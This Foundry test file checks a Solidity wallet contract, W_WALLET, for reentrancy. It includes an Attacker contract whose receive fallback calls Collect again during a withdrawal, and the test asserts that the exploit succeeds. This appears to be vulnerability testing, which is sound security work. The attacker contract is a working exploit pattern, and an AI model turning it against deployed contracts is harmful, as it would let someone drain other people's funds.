
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyW_WALLET is Test {
    using stdStorage for StdStorage;
    
    W_WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new W_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < type(uint128).max);
        
        uint256 initialAttackerBalance = attackVal * 2;
        
        vm.deal(address(_contractUnderTest), initialAttackerBalance);
        vm.deal(address(_attacker), initialAttackerBalance);
        vm.deal(address(this), initialAttackerBalance);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1 days);
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            
            if (attackCallCount == 1) {
                _victim.Collect(storedAttackVal);
            }
        }
    }
}
